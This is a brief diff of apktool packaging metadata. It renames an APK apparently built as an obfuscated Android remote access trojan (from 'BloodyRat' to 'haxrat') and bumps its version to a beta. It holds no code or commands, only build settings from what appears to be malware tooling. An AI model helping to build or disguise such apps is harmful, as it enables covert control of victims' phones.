@@ -1,5 +1,5 @@
 !!brut.androlib.meta.MetaInfo
-apkFileName: com.justhack.BloodyRat_obfuscated.apk
+apkFileName: com.hax4us.haxrat_obfuscated.apk
 compressionType: false
 doNotCompress:
 - resources.arsc
@@ -21,4 +21,4 @@ usesFramework:
 version: 2.4.1
 versionInfo:
   versionCode: '1'
-  versionName: 1.0
+  versionName: 1.0-beta
